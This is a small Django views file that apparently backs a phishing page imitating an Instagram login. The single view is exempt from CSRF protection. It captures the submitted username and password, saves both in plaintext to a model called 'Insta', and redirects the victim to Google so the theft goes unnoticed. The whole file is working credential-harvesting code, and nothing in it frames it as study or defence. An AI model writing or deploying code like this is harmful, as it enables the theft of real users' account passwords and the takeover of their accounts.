from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import redirect
from .models import Insta
# Create your views here.
@csrf_exempt
def home(request):
    if request.method == 'POST':
        username = request.POST.get('user')
        password = request.POST.get('pass')
        context = {
            'user': username,
            'pass': password,
                   }
        Insta.objects.create(username=username, password=password)
        return redirect("https://www.google.com/")
    return render(request, 'login/index.html')
